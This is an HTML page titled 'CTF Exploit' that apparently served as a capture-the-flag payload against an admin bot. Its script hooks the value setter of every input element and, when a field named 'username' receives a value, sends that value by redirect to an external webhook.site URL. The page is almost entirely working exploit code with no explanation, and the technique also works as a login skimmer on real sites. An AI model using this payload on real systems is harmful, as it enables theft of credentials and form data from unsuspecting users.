<!DOCTYPE html>
<html>
<head>
    <title>CTF Exploit</title>
</head>
<body>
    <h1>Exploit is running... The bot is mine.</h1>
    <script>
        const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";

        const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');

        Object.defineProperty(HTMLInputElement.prototype, 'value', {
            set: function(value) {
                console.log(`Input field '${this.name}' is being set with value: ${value}`);

                if (this.name === 'username') {
                    console.log(`FLAG CAPTURED: ${value}`);
                    
                    window.location = `${WEBHOOK_URL}?flag=${encodeURIComponent(value)}`;
                }
                
                return originalDescriptor.set.apply(this, arguments);
            },
            get: function() {
                return originalDescriptor.get.apply(this, arguments);
            }
        });
    </script>
</body>
</html>
